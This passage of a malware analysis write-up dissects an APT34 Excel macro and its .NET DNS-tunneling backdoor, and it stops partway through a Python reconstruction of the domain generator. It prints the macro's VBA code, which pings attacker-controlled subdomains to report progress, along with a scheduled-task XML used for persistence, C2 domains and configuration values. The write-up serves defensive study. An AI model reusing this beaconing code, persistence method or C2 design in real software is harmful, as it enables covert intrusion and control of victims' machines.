<span class="k">Function</span> <span class="nf">eNotif</span><span class="p">(</span><span class="n">tMsg</span><span class="p">)</span> <span class="c1">'tMsg = "zbbfz","zbafz","zbeez","zbdez","zbcez","zbbez","zbaez" , "zbbbz" , "zbabz"</span>
    <span class="n">GetIPfromHostName</span><span class="p">(</span><span class="s">"qw"</span> <span class="o">&amp;</span> <span class="n">tMsg</span> <span class="o">&amp;</span> <span class="n">random_number</span> <span class="o">&amp;</span> <span class="s">".joexpediagroup.com"</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Function</span>

<span class="k">Function</span> <span class="nf">GetIPfromHostName</span><span class="p">(</span><span class="n">p_sHostName</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">String</span>

    <span class="k">On</span> <span class="k">Error</span> <span class="k">GoTo</span> <span class="n">o5</span>
    <span class="k">Dim</span> <span class="nv">wmiQuery</span>
    <span class="k">Dim</span> <span class="nv">objWMIService</span>
    <span class="k">Dim</span> <span class="nv">objPing</span>
    <span class="k">Dim</span> <span class="nv">objStatus</span>
	
   <span class="c1">' Win32_PingStatus WMI class represents the values returned by the standard ping command.</span>
    <span class="n">wmiQuery</span> <span class="o">=</span> <span class="s">"Select * From Win32_PingStatus Where Address = '"</span> <span class="o">&amp;</span> <span class="n">p_sHostName</span> <span class="o">&amp;</span> <span class="s">"'"</span>
	
    <span class="c1">' Creating a WMI instance to query information in the cimv2 category.</span>
    <span class="k">Set</span> <span class="n">objWMIService</span> <span class="o">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s">"winmgmts:\\.\root\cimv2"</span><span class="p">)</span>
    <span class="k">Set</span> <span class="n">objPing</span> <span class="o">=</span> <span class="n">objWMIService</span><span class="p">.</span><span class="n">ExecQuery</span><span class="p">(</span><span class="n">wmiQuery</span><span class="p">)</span>

    <span class="k">For</span> <span class="k">Each</span> <span class="n">objStatus</span> <span class="ow">In</span> <span class="n">objPing</span>
        <span class="k">If</span> <span class="n">objStatus</span><span class="p">.</span><span class="n">StatusCode</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">Then</span>
            <span class="n">GetIPfromHostName</span> <span class="o">=</span> <span class="n">objStatus</span><span class="p">.</span><span class="n">ProtocolAddress</span>
        <span class="k">Else</span>
            <span class="n">GetIPfromHostName</span> <span class="o">=</span> <span class="s">"Unreachable"</span>
        <span class="k">End</span> <span class="k">If</span>
    <span class="k">Next</span>
    <span class="k">GoTo</span> <span class="n">o6</span>
<span class="n">o5</span><span class="p">:</span>
    <span class="n">GetIPfromHostName</span> <span class="o">=</span> <span class="s">"someting wrong"</span>
<span class="n">o6</span><span class="p">:</span>
<span class="k">End</span> <span class="k">Function</span>
</code></pre></div></div>

<h2 id="macro-capabilities">Macro Capabilities</h2>

<ol>
  <li>
    <p>Hides the current sheet and shows the new sheet that contains one of the Jordan government ministry’s logo.</p>
  </li>
  <li>
    <p>Calls the <code class="language-plaintext highlighter-rouge">eNotif</code> function at every step of the macro execution notifying the C2 with the execution progress. To send a notification it builds different subdomains each step .The domain consists of the following parts
<code class="language-plaintext highlighter-rouge">qw + 5 chars changes depending on the macro stage that identify the macro current stage + 4 random digits + .joexpediagroup.com</code> .It uses the WMI to ping the C2 server.</p>
  </li>
  <li>
    <p>Checks if there is a mouse connected ( avoiding automated analysis ) and if so it Create three files a malicious PE file is created and dropped in <code class="language-plaintext highlighter-rouge">%LocalAppData%\MicrosoftUpdate\update.exe</code> , A configuration file is created and dropped in <code class="language-plaintext highlighter-rouge">%LocalAppData%\MicrosoftUpdate\update.exe.config</code> , And the third file  dropped in  <code class="language-plaintext highlighter-rouge">%LocalAppData%\MicrosoftUpdate\Microsoft.Exchange.WebServices.dll</code>, was signed and clean. The files content is in base64 encoded in the excel sheet , by reading the content of the UserForm1.label1, UserForm2.label1 and UserForm3.label1 they are in base64 format, decodes them and writes them into the created files respectively.</p>
  </li>
  <li>
    <p>Checking that the malicious PE file was successfully created and if not for any reason , it writes it using a technique that loads a DotNet assembly directly using mscorlib and Assembly.Load by manually accessing the VTable of the IUnknown. This technique was taken from <a href="https://gist.github.com/monoxgas/1b36031c5593ebfed3229f4">Github</a>. This technique was not used in this macro since the file was already Created, although the function is trying to decode content from  word.Label.Caption and it supposed to be UserForm1.label1 instead , which actually contains nothing , so it’s a useless function ,and the developer was just testing this technique .</p>
  </li>
  <li>
    <p>The macro creates a persistence method for update.exe file. This is done by setting a scheduled task under the name of the MicrosoftUpdate .</p>
  </li>
</ol>

<h2 id="scheduled-task">Scheduled Task</h2>
<p>I commented the xml to be easily understandable.</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version=""1.0"" encoding=""UTF-16""?&gt;</span>
<span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">""</span><span class="err">1.2""</span> <span class="na">xmlns=</span><span class="s">""</span><span class="err">http://schemas.microsoft.com/windows/2004/02/mit/task""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;RegistrationInfo&gt;</span>
        <span class="nt">&lt;Author&gt;</span>Microsoft Corporation<span class="nt">&lt;/Author&gt;</span>
        <span class="nt">&lt;Description&gt;</span>Microsoft Important Update<span class="nt">&lt;/Description&gt;</span>
    <span class="nt">&lt;/RegistrationInfo&gt;</span>
    <span class="nt">&lt;Triggers&gt;</span>
        <span class="nt">&lt;TimeTrigger&gt;</span>
            <span class="nt">&lt;Repetition&gt;</span>
                <span class="nt">&lt;Interval&gt;</span>PT4M<span class="nt">&lt;/Interval&gt;</span>  <span class="c">&lt;!-- Restart task every 4 Minutes --&gt;</span>
            <span class="nt">&lt;/Repetition&gt;</span>
            <span class="nt">&lt;StartBoundary&gt;</span>" <span class="err">&amp;</span> Format(DateAdd("n", 1, Now()), "yyyy-mm-ddThh:nn:ss") <span class="err">&amp;</span> "<span class="nt">&lt;/StartBoundary&gt;</span> 
            <span class="c">&lt;!--  Specifies the date and time when the trigger is activated. --&gt;</span>
            <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span> <span class="c">&lt;!--Specifies that the trigger is enabled.--&gt;</span>
        <span class="nt">&lt;/TimeTrigger&gt;</span>
    <span class="nt">&lt;/Triggers&gt;</span>
    <span class="nt">&lt;Principals&gt;</span> <span class="c">&lt;!--Specifies the security contexts that can be used to run the task.--&gt;</span>
        <span class="nt">&lt;Principal</span> <span class="na">id=</span><span class="s">""</span><span class="err">Author""</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- Specifies the security credentials for a principal. These credentials define the security context that a task runs under.--&gt;</span>
            <span class="nt">&lt;LogonType&gt;</span>InteractiveToken<span class="nt">&lt;/LogonType&gt;</span>
            <span class="c">&lt;!-- User must already be logged on. The task will be run only in an existing interactive session.--&gt;</span>
            <span class="nt">&lt;RunLevel&gt;</span>LeastPrivilege<span class="nt">&lt;/RunLevel&gt;</span>
        <span class="nt">&lt;/Principal&gt;</span>
    <span class="nt">&lt;/Principals&gt;</span>
    <span class="nt">&lt;Settings&gt;</span>
        <span class="nt">&lt;MultipleInstancesPolicy&gt;</span>Parallel<span class="nt">&lt;/MultipleInstancesPolicy&gt;</span> 
        <span class="c">&lt;!-- Starts a new instance while an existing instance is running. --&gt;</span>
        <span class="nt">&lt;DisallowStartIfOnBatteries&gt;</span>false<span class="nt">&lt;/DisallowStartIfOnBatteries&gt;</span> 
        <span class="c">&lt;!--Specifies that the task will not be started if the computer is running on battery power.--&gt;</span>
        <span class="nt">&lt;StopIfGoingOnBatteries&gt;</span>false<span class="nt">&lt;/StopIfGoingOnBatteries&gt;</span> 
        <span class="c">&lt;!--Specifies that the task will be stopped if the computer switches to battery power.--&gt;</span>
        <span class="nt">&lt;AllowHardTerminate&gt;</span>true<span class="nt">&lt;/AllowHardTerminate&gt;</span> 
        <span class="c">&lt;!--Specifies if the Task Scheduler service allows hard termination of the task.--&gt;</span>
        <span class="nt">&lt;StartWhenAvailable&gt;</span>true<span class="nt">&lt;/StartWhenAvailable&gt;</span> 
        <span class="c">&lt;!--Specifies that the Task Scheduler can start the task at any time after its scheduled time has passed.--&gt;</span>
        <span class="nt">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span class="nt">&lt;/RunOnlyIfNetworkAvailable&gt;</span> 
        <span class="c">&lt;!--Specifies that the Task Scheduler will run the task only when a network is available.--&gt;</span>
        <span class="nt">&lt;IdleSettings&gt;</span>
         <span class="c">&lt;!--Specifies how the Task Scheduler performs tasks when the computer is in an idle state.--&gt;</span>
            <span class="nt">&lt;Duration&gt;</span>PT10M<span class="nt">&lt;/Duration&gt;</span>
            <span class="c">&lt;!-- 10 Minute --&gt;</span> <span class="c">&lt;!--Specifies how long the computer must be in an idle state before the task is run.--&gt;</span>
            <span class="nt">&lt;WaitTimeout&gt;</span>PT1H<span class="nt">&lt;/WaitTimeout&gt;</span>
        <span class="c">&lt;!-- 1 Hour --&gt;</span> <span class="c">&lt;!--Specifies the amount of time that the Task Scheduler will wait for an idle condition to 
        occur. --&gt;</span>
        <span class="nt">&lt;/IdleSettings&gt;</span>
        <span class="nt">&lt;AllowStartOnDemand&gt;</span>true<span class="nt">&lt;/AllowStartOnDemand&gt;</span> 
        <span class="c">&lt;!--Specifies that the task can be started by using either the Run command or the Context menu.--&gt;</span>
        <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
        <span class="c">&lt;!--Specifies that the task is enabled. The task can be performed only when this setting is True. --&gt;</span>
        <span class="nt">&lt;Hidden&gt;</span>false<span class="nt">&lt;/Hidden&gt;</span>
        <span class="c">&lt;!--Specifies, by default, that the task will not be visible in the user interface (UI).--&gt;</span>
        <span class="nt">&lt;RunOnlyIfIdle&gt;</span>false<span class="nt">&lt;/RunOnlyIfIdle&gt;</span> <span class="c">&lt;!--Specifies that the task is run only when the computer is in an idle 
        state.--&gt;</span>
        <span class="nt">&lt;WakeToRun&gt;</span>false<span class="nt">&lt;/WakeToRun&gt;</span> 
        <span class="c">&lt;!--Specifies that Task Scheduler will wake the computer before it runs the task.--&gt;</span>
        <span class="nt">&lt;ExecutionTimeLimit&gt;</span>P20D<span class="nt">&lt;/ExecutionTimeLimit&gt;</span> 
        <span class="c">&lt;!-- 20 Days --&gt;</span> <span class="c">&lt;!--Specifies the amount of time allowed to complete the task.--&gt;</span> 
        <span class="nt">&lt;Priority&gt;</span>7<span class="nt">&lt;/Priority&gt;</span>  <span class="c">&lt;!-- BELOW_NORMAL_PRIORITY_CLASS	THREAD_PRIORITY_BELOW_NORMAL--&gt;</span>
    <span class="nt">&lt;/Settings&gt;</span>
    <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">""</span><span class="err">Author""</span><span class="nt">&gt;</span>   <span class="c">&lt;!-- Execute the malware --&gt;</span>
        <span class="nt">&lt;Exec&gt;</span>
            <span class="nt">&lt;Command&gt;</span>""" <span class="err">&amp;</span> Malware <span class="err">&amp;</span> """<span class="nt">&lt;/Command&gt;</span>
            <span class="nt">&lt;WorkingDirectory&gt;</span>" <span class="err">&amp;</span> drop_path <span class="err">&amp;</span> "<span class="nt">&lt;/WorkingDirectory&gt;</span>
        <span class="nt">&lt;/Exec&gt;</span>
    <span class="nt">&lt;/Actions&gt;</span>
<span class="nt">&lt;/Task&gt;</span>

</code></pre></div></div>

<h2 id="macro-states-notifications">Macro States Notifications</h2>

<table>
  <thead>
    <tr>
      <th>C2 Serve</th>
      <th>State</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>qwzbabz[four-digits].joexpediagroup[.]com</td>
      <td>Macro started</td>
    </tr>
    <tr>
      <td>qwzbbbz[four-digits].joexpediagroup[.]com</td>
      <td>Connected successfully to task scheduler to get the task folder that contains the tasks</td>
    </tr>
    <tr>
      <td>qwzbaez[four-digits].joexpediagroup[.]com</td>
      <td>Malware created</td>
    </tr>
    <tr>
      <td>qwzbbez[four-digits].joexpediagroup[.]com</td>
      <td>Config created</td>
    </tr>
    <tr>
      <td>qwzbcez[four-digits].joexpediagroup[.]com</td>
      <td>DLL created</td>
    </tr>
    <tr>
      <td>qwzbdez[four-digits].joexpediagroup[.]com</td>
      <td>If the malware is not created</td>
    </tr>
    <tr>
      <td>qwzbeez[four-digits].joexpediagroup[.]com</td>
      <td>Create malware if not created</td>
    </tr>
    <tr>
      <td>qwzbafz[four-digits].joexpediagroup[.]com</td>
      <td>Task scheduler configuration</td>
    </tr>
    <tr>
      <td>qwzbbfz[four-digits].joexpediagroup[.]com</td>
      <td>Scheduled task created</td>
    </tr>
  </tbody>
</table>

<h2 id="dropped-configuration">Dropped Configuration</h2>

<p><a href="/assets/Malware-Analysis/Apt34/000.PNG"><img src="/assets/Malware-Analysis/Apt34/000.PNG" alt="000.PNG" /></a></p>

<h1 id="stage2-net-malicious-file">Stage2 .net Malicious File</h1>

<p>Before digging in , we can get an overview about what the malware can do . it seems it can execute commands , compress / decompress capabilities , and it have a pseudorandom number generator . I will start explaining the least interesting parts first.</p>

<p><a href="/assets/Malware-Analysis/Apt34/14.PNG"><img src="/assets/Malware-Analysis/Apt34/14.PNG" alt="14.PNG" /></a></p>

<h2 id="mutex">Mutex</h2>

<p>The malware creates a mutex object <code class="language-plaintext highlighter-rouge">726a06ad-475b-4bc6-8466-f08960595f1e</code> to avoid having more than one instance running. 
If instance of the malware is already running therefore malware exits.</p>

<p><a href="/assets/Malware-Analysis/Apt34/22.PNG"><img src="/assets/Malware-Analysis/Apt34/22.PNG" alt="22.PNG" /></a></p>

<h2 id="machine-states">Machine States</h2>
<p>The malware utilizes the concept of finite state machine .</p>

<p>The makeup of a finite state machine consists of the following:</p>
<ol>
  <li>A set of potential input events.</li>
  <li>A set of probable output events that correspond to the potential input events.</li>
  <li>A set of expected states the system can exhibit.</li>
  <li>The machine can either move to the next state or stay in the same state.</li>
</ol>

<p>In the following figure , the machine start in a state called <code class="language-plaintext highlighter-rouge">Door Closed</code> , if event called <code class="language-plaintext highlighter-rouge">opening the door</code> happens the machine state changes to <code class="language-plaintext highlighter-rouge">Door open</code>.
So our malware although have some states and events that make it move to other states to do malicious activity.</p>

<p><a href="/assets/Malware-Analysis/Apt34/finite-state-machines-1.png"><img src="/assets/Malware-Analysis/Apt34/finite-state-machines-1.png" alt="finite-state-machines-1.png" /></a></p>

<p>We can see a dictionary of transactions definitions and an initialization to the current state as <code class="language-plaintext highlighter-rouge">Beign</code> , 
as example if the current machine state is <code class="language-plaintext highlighter-rouge">Begin</code> and we have a command telling us to <code class="language-plaintext highlighter-rouge">Start</code> then we are updating the current machine state to <code class="language-plaintext highlighter-rouge">Alive</code> as seen below , we will get a better understanding of the states idea while we are going through our analysis.</p>

<p><a href="/assets/Malware-Analysis/Apt34/11.PNG"><img src="/assets/Malware-Analysis/Apt34/11.PNG" alt="11.PNG" /></a></p>

<p>Here is a table of all possible states and transactions :</p>

<table>
  <thead>
    <tr>
      <th>Current Machine State</th>
      <th>Machine Command</th>
      <th>New Machine State</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Begin</td>
      <td>Start</td>
      <td>Alive</td>
    </tr>
    <tr>
      <td>Sleep</td>
      <td>Start</td>
      <td>Alive</td>
    </tr>
    <tr>
      <td>Alive</td>
      <td>Failed</td>
      <td>Sleep (21600000- 28800000)</td>
    </tr>
    <tr>
      <td>Alive</td>
      <td>HasData</td>
      <td>Receive</td>
    </tr>
    <tr>
      <td>Receive</td>
      <td>Failed</td>
      <td>Sleep (40000-80000)</td>
    </tr>
    <tr>
      <td>Receive</td>
      <td>DataReceived</td>
      <td>Do</td>
    </tr>
    <tr>
      <td>Do</td>
      <td>Failed</td>
      <td>SecondSleep (1800000- 2700000)</td>
    </tr>
    <tr>
      <td>Do</td>
      <td>HasResult</td>
      <td>Send</td>
    </tr>
    <tr>
      <td>Send</td>
      <td>Failed</td>
      <td>Sleep (40000-80000)</td>
    </tr>
    <tr>
      <td>Send</td>
      <td>HasData</td>
      <td>SendAndReceive</td>
    </tr>
    <tr>
      <td>Send</td>
      <td>DataSended</td>
      <td>Do</td>
    </tr>
    <tr>
      <td>Send</td>
      <td>DataSendedAndHasData</td>
      <td>Receive</td>
    </tr>
    <tr>
      <td>SendAndReceive</td>
      <td>Failed</td>
      <td>Sleep (40000-80000)</td>
    </tr>
    <tr>
      <td>SendAndReceive</td>
      <td>DataReceived</td>
      <td>Send</td>
    </tr>
    <tr>
      <td>SendAndReceive</td>
      <td>DataSended</td>
      <td>Receive</td>
    </tr>
    <tr>
      <td>SendAndReceive</td>
      <td>DataSendedAndReceived</td>
      <td>Do</td>
    </tr>
    <tr>
      <td>SecondSleep</td>
      <td>Start</td>
      <td>Alive</td>
    </tr>
  </tbody>
</table>

<p>We have 8 states , every state have a certain value as seen below :</p>

<table>
  <thead>
    <tr>
      <th>MachineState</th>
      <th>Values</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>MachineState Begin</td>
      <td>0</td>
    </tr>
    <tr>
      <td>MachineState Sleep</td>
      <td>1</td>
    </tr>
    <tr>
      <td>MachineState Alive</td>
      <td>2</td>
    </tr>
    <tr>
      <td>MachineState Receive</td>
      <td>3</td>
    </tr>
    <tr>
      <td>MachineState Do</td>
      <td>4</td>
    </tr>
    <tr>
      <td>MachineState Send</td>
      <td>5</td>
    </tr>
    <tr>
      <td>MachineState SendAndReceive</td>
      <td>6</td>
    </tr>
    <tr>
      <td>MachineState SecondSleep</td>
      <td>7</td>
    </tr>
  </tbody>
</table>

<p>So after initializing the current <code class="language-plaintext highlighter-rouge">MachineState</code> as <code class="language-plaintext highlighter-rouge">Beign</code> , it enters the first case <code class="language-plaintext highlighter-rouge">Begin</code> and the current machine state will change to <code class="language-plaintext highlighter-rouge">Alive</code> and start doing it’s malicious activity .</p>

<h2 id="configuration">Configuration</h2>
<p>The malware Loades random number into counter variable , initializes domains , and a list of byte array called <code class="language-plaintext highlighter-rouge">listData</code></p>

<p><a href="/assets/Malware-Analysis/Apt34/33.PNG"><img src="/assets/Malware-Analysis/Apt34/33.PNG" alt="33.PNG" /></a></p>

<p>Here is some variables in config class and its values which we will see being used in other classes.</p>

<table>
  <thead>
    <tr>
      <th>Variable</th>
      <th>Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Config.DelayMinAlive</td>
      <td>21600000</td>
    </tr>
    <tr>
      <td>Config.DelayMaxAlive</td>
      <td>28800000</td>
    </tr>
    <tr>
      <td>Config.DelayMinCommunicate</td>
      <td>40000</td>
    </tr>
    <tr>
      <td>Config.DelayMaxCommunicate</td>
      <td>80000</td>
    </tr>
    <tr>
      <td>Config.DelayMinSecondCheck</td>
      <td>1800000</td>
    </tr>
    <tr>
      <td>Config.DelayMaxSecondCheck</td>
      <td>2700000</td>
    </tr>
    <tr>
      <td>Config.DelayMinRetry</td>
      <td>300000</td>
    </tr>
    <tr>
      <td>Config.DelayMaxRetry</td>
      <td>420000</td>
    </tr>
    <tr>
      <td>Config.MaxTry</td>
      <td>7</td>
    </tr>
    <tr>
      <td>Config.TaskExecTimeout</td>
      <td>10800000</td>
    </tr>
    <tr>
      <td>Config.SendCount</td>
      <td>12</td>
    </tr>
    <tr>
      <td>Config.CharsDomain</td>
      <td>“abcdefghijklmnopqrstuvwxyz0123456789”</td>
    </tr>
    <tr>
      <td>Config.CharsCounter</td>
      <td>“razupgnv2w01eos4t38h7yqidxmkljc6b9f5”</td>
    </tr>
    <tr>
      <td>Config.FirstAliveKey</td>
      <td>“haruto”</td>
    </tr>
    <tr>
      <td>Config._AgentID</td>
      <td>null</td>
    </tr>
    <tr>
      <td>Config._MaxCounter</td>
      <td>46656</td>
    </tr>
  </tbody>
</table>

<p>Before discussing the more important parts. lets first discuss two states <code class="language-plaintext highlighter-rouge">SleepAlive</code> and <code class="language-plaintext highlighter-rouge">SleepSecond</code></p>

<h2 id="sleepalive">SleepAlive</h2>
<p>The malware can sleep for very long time by calling MakeDelay. 
<code class="language-plaintext highlighter-rouge">SleepAlive</code> state simply sleeps for certain time then return machine command start , so after sleeping the <code class="language-plaintext highlighter-rouge">MahcineState</code> will be <code class="language-plaintext highlighter-rouge">Alive</code> . you can check the table of states and commands .</p>

<p><a href="/assets/Malware-Analysis/Apt34/16.PNG"><img src="/assets/Malware-Analysis/Apt34/16.PNG" alt="16.PNG" /></a></p>

<h2 id="sleepsecond">SleepSecond</h2>

<p>Same as <code class="language-plaintext highlighter-rouge">SleepAlive</code> except for the argument getting passed to <code class="language-plaintext highlighter-rouge">MakeDleay</code> fuction.</p>

<p><a href="/assets/Malware-Analysis/Apt34/17.PNG"><img src="/assets/Malware-Analysis/Apt34/17.PNG" alt="17.PNG" /></a></p>

<h2 id="makedelay">MakeDelay</h2>

<p>The possible arguments for MakeDelay are:</p>

<table>
  <thead>
    <tr>
      <th>DelayType</th>
      <th>Values</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Enums.DelayType Alive</td>
      <td>0</td>
    </tr>
    <tr>
      <td>Enums.DelayType Communicate</td>
      <td>1</td>
    </tr>
    <tr>
      <td>Enums.DelayType SecondCheck</td>
      <td>2</td>
    </tr>
    <tr>
      <td>Enums.DelayType Retry</td>
      <td>3</td>
    </tr>
  </tbody>
</table>

<p>Depending on the argument being passed , it initializes min and max values with certain values discussed above in config table .
then get a random number between min and max and that random value will be the time to sleep .</p>

<p><a href="/assets/Malware-Analysis/Apt34/4.PNG"><img src="/assets/Malware-Analysis/Apt34/4.PNG" alt="4.PNG" /></a></p>

<p>MakeDelay is called in other states although .</p>

<h2 id="alive-state">Alive State</h2>

<p>Lets start making things a little bit interesting .
This malware uses DNS tunneling to communicate with its C2 as we will see  everything the malware need from the C2 is built into the DNS request.
The first state the malware gets in is <code class="language-plaintext highlighter-rouge">Alive</code>.
First the malware checks if an <code class="language-plaintext highlighter-rouge">AgentId</code> exist which is not , and then call <code class="language-plaintext highlighter-rouge">TryMe</code> with <code class="language-plaintext highlighter-rouge">_FirstAlive</code> function as argument .</p>

<p><a href="/assets/Malware-Analysis/Apt34/12.PNG"><img src="/assets/Malware-Analysis/Apt34/12.PNG" alt="12.PNG" /></a></p>

<p><code class="language-plaintext highlighter-rouge">TryMe</code> takes a function as an argument , and try to execute the function that is passed to it , until it return success or the  number of tries exceeded <code class="language-plaintext highlighter-rouge">MaxTry</code> , between every try the malware sleep for some time using <code class="language-plaintext highlighter-rouge">MakeDelay</code>.  If number of tries exceeded <code class="language-plaintext highlighter-rouge">MaxTry</code> the malware adds 1 to the counter that was initialized in the first place .</p>

<p><a href="/assets/Malware-Analysis/Apt34/5.PNG"><img src="/assets/Malware-Analysis/Apt34/5.PNG" alt="5.PNG" /></a></p>

<p><code class="language-plaintext highlighter-rouge">FirstAlive</code> constructs a subdomain by passing <code class="language-plaintext highlighter-rouge">FirstAlive</code> parameter which is 0 and <code class="language-plaintext highlighter-rouge">FirstAliveKey</code> which is <code class="language-plaintext highlighter-rouge">haruto</code> to the <code class="language-plaintext highlighter-rouge">DomainMaker</code> and try to connect to it and get its address .</p>

<p><a href="/assets/Malware-Analysis/Apt34/6.PNG"><img src="/assets/Malware-Analysis/Apt34/6.PNG" alt="6.PNG" /></a></p>

<p>There are other possible arguments for the first parameter:</p>

<table>
  <thead>
    <tr>
      <th>DomainType</th>
      <th>Values</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Enums.DomainType FirstAlive</td>
      <td>0</td>
    </tr>
    <tr>
      <td>Enums.DomainType Send</td>
      <td>1</td>
    </tr>
    <tr>
      <td>Enums.DomainType Receive</td>
      <td>2</td>
    </tr>
    <tr>
      <td>Enums.DomainType SendAndReceive</td>
      <td>3</td>
    </tr>
    <tr>
      <td>Enums.DomainType MainAlive</td>
      <td>4</td>
    </tr>
  </tbody>
</table>

<h2 id="python-implementation-of-the-dga">Python Implementation of the DGA</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">math</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">CharsDomain</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyz0123456789"</span>
<span class="n">CharsCounter</span> <span class="o">=</span> <span class="s">"razupgnv2w01eos4t38h7yqidxmkljc6b9f5"</span>

<span class="k">class</span> <span class="nc">RandomMersenneTwister</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">c_seed</span><span class="o">=</span><span class="mi">5489</span><span class="p">):</span>

        <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">w</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">r</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">624</span><span class="p">,</span> <span class="mi">397</span><span class="p">,</span> <span class="mi">31</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">a</span> <span class="o">=</span> <span class="mh">0x9908B0DF</span>
        <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">u</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">d</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
        <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">s</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x9D2C5680</span><span class="p">)</span>
        <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">t</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">c</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mh">0xEFC60000</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">l</span> <span class="o">=</span> <span class="mi">18</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">f</span> <span class="o">=</span> <span class="mi">1812433253</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">MT</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">)]</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">lower_mask</span> <span class="o">=</span> <span class="mh">0x7FFFFFFF</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">upper_mask</span> <span class="o">=</span> <span class="mh">0x80000000</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">c_seed</span> <span class="o">=</span> <span class="n">c_seed</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">seed</span><span class="p">(</span><span class="n">c_seed</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">seed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">num</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">):</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">f</span> <span class="o">*</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">w</span><span class="o">-</span><span class="mi">2</span><span class="p">)))</span> <span class="o">+</span> <span class="n">i</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>

    <span class="k">def</span> <span class="nf">twist</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">):</span>
            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="bp">self</span><span class="p">.</span><span class="n">upper_mask</span><span class="p">)</span> <span class="o">+</span> \
